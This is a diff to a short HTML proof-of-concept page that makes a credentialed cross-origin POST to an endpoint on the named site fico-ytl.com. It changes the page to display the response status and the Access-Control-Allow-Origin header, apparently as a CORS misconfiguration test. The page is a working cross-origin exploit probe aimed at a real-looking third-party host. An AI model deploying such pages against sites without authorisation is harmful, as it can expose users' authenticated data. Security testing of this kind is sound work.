@@ -1,24 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head><title>CORS PoC</title></head>
+<head>
+  <title>CORS PoC - Authenticated Fetch</title>
+</head>
 <body>
-  <h2>CORS Exploit Test</h2>
-  <p>If vulnerable, response from fico-ytl.com will be shown below:</p>
-  <pre id="output">Loading...</pre>
+  <h2>Attempting CORS fetch with credentials...</h2>
+  <pre id="result">[Waiting for response]</pre>
 
   <script>
     fetch("https://fico-ytl.com/cdn-cgi/rum", {
-      method: "GET",
-      credentials: "include"
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        "pageloadId": "cors-test-1337",
+        "location": "https://fico-ytl.com/",
+        "eventType": 1
+      })
     })
-    .then(res => res.text())
-    .then(data => {
-      document.getElementById("output").textContent = data;
+    .then(response => {
+      document.getElementById("result").textContent =
+        `Status: ${response.status}\nAccess-Control-Allow-Origin: ${response.headers.get("Access-Control-Allow-Origin")}\n\nResponse:\n${response.statusText}`;
     })
     .catch(err => {
-      document.getElementById("output").textContent = "Request failed: " + err;
+      document.getElementById("result").textContent = `Request failed: ${err}`;
     });
   </script>
 </body>
 </html>
- 
